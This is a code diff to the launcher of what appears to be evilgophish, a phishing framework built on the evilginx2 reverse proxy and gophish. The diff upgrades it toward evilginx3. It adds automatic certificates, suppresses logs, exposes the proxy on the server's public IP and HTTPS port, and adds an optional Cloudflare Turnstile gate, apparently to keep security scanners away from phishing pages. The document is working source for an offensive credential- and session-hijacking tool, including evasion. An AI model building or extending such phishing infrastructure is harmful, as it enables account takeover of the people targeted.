@@ -3,15 +3,18 @@ package main
 import (
 	"flag"
 	"fmt"
-	"io/ioutil"
+	_log "log"
 	"os"
 	"os/user"
 	"path/filepath"
 	"regexp"
+	"strings"
 
+	"github.com/caddyserver/certmagic"
 	"github.com/kgretzky/evilginx2/core"
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
+	"go.uber.org/zap"
 
 	"github.com/fatih/color"
 )
@@ -24,6 +27,7 @@ var cfg_dir = flag.String("c", "", "Configuration directory path")
 var version_flag = flag.Bool("v", false, "Show version")
 var gophish_db = flag.String("g", "", "Full path to gophish database")
 var feed_enabled = flag.Bool("feed", false, "Enable live feed")
+var turnstile = flag.String("turnstile", "", "Turnstile public/private key separated by \":\"")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -46,7 +50,7 @@ func showAd() {
 func main() {
 	flag.Parse()
 	if *gophish_db == "" {
-		log.Fatal("you need to provide the full path to the gophish database: ./evilginx2 -g /opt/evilgophish/gophish/gophish.db")
+		log.Fatal("you need to provide the full path to the gophish database: ./evilginx3 -g /opt/evilgophish/gophish/gophish.db")
 		return
 	}
 
@@ -60,6 +64,10 @@ func main() {
 
 	core.Banner()
 	showAd()
+
+	_log.SetOutput(log.NullLogger().Writer())
+	certmagic.Default.Logger = zap.NewNop()
+	certmagic.DefaultACME.Logger = zap.NewNop()
 
 	if *phishlets_dir == "" {
 		*phishlets_dir = joinPath(exe_dir, "./phishlets")
@@ -116,11 +124,6 @@ func main() {
 
 	crt_path := joinPath(*cfg_dir, "./crt")
 
-	if err := core.CreateDir(crt_path, 0700); err != nil {
-		log.Fatal("mkdir: %v", err)
-		return
-	}
-
 	cfg, err := core.NewConfig(*cfg_dir, "")
 	if err != nil {
 		log.Fatal("config: %v", err)
@@ -146,7 +149,7 @@ func main() {
 		return
 	}
 
-	files, err := ioutil.ReadDir(phishlets_path)
+	files, err := os.ReadDir(phishlets_path)
 	if err != nil {
 		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
 		return
@@ -181,7 +184,17 @@ func main() {
 		return
 	}
 
-	hp, _ := core.NewHttpProxy("127.0.0.1", 8443, cfg, crt_db, db, bl, *developer_mode, *feed_enabled)
+	var hp *core.HttpProxy
+
+	if *turnstile != "" {
+		turnstileParts := strings.Split(*turnstile, ":")
+		hs, _ := core.NewHttpServer(turnstileParts[0], turnstileParts[1], true)
+		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, *feed_enabled, true)
+		hs.Start(hp)
+	} else {
+		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, *feed_enabled, false)
+	}
+
 	hp.Start()
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
